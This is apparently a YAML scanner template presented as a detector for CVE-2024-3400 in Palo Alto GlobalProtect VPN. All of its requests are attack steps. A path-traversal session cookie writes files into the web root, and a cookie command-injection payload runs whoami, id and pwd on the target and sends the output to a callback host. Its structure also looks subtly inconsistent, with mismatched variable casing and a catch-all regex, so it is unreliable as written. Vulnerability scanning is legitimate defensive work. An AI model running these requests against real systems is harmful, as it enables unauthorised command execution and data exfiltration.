id: cve-2024-3400

info:
  name: Palo Alto GlobalProtect Command Injection
  author: hexa
  severity: high
  description: Detects command injection vulnerability CVE-2024-3400 in Palo Alto GlobalProtect VPN.

requests:
  - method: POST
    path:
      - "{{BaseURL}}/ssl-vpn/hipreport.esp"
    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
      Content-Type: "application/x-www-form-urlencoded"
      Cookie: "SESSID=../../../var/appweb/sslvpndocs/global-protect/portal/images/{{Filename}}"
    matchers:
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: file_content
        regex:
          - ".*"
    payloads:
      filename:
        - "exploitCheck.exp"

  - method: GET
    path:
      - "{{BaseURL}}/global-protect/portal/images/{{Filename}}"
    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
    matchers:
      - type: status
        status:
          - 403
    extractors:
      - type: regex
        name: vuln_check
        regex:
          - "403"

  - method: POST
    path:
      - "{{BaseURL}}/ssl-vpn/hipreport.esp"
    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
      Content-Type: "application/x-www-form-urlencoded"
      Cookie: "SESSID=../../../../opt/panlogs/tmp/device_telemetry/minute/attack782`{{CallbackURL}}?r=$({{Payload}})`"
    matchers:
      - type: word
        words:
          - "Success"
    payloads:
      payload:
        - "whoami"
        - "id"
        - "pwd"
    extractors:
      - type: regex
        name: cmd_exec
        regex:
          - "Success"
